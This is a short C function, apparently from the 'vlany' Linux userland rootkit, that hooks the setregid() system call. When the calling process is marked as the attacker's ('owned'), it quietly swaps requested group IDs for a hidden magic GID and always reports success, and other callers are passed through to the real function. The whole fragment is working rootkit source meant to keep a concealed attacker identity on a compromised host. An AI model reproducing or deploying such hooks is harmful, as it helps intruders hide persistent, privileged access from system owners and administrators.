int setregid(gid_t rgid, gid_t egid)
{
    #ifdef DEBUG
        printf("[vlany] setregid() called\n");
    #endif

    HOOK(old_setregid, CSETREGID);

    if(owned()) { if(rgid == 43 || egid == 43) { old_setregid(MAGIC_GID, MAGIC_GID); } return 0; }

    return old_setregid(rgid, egid);
}
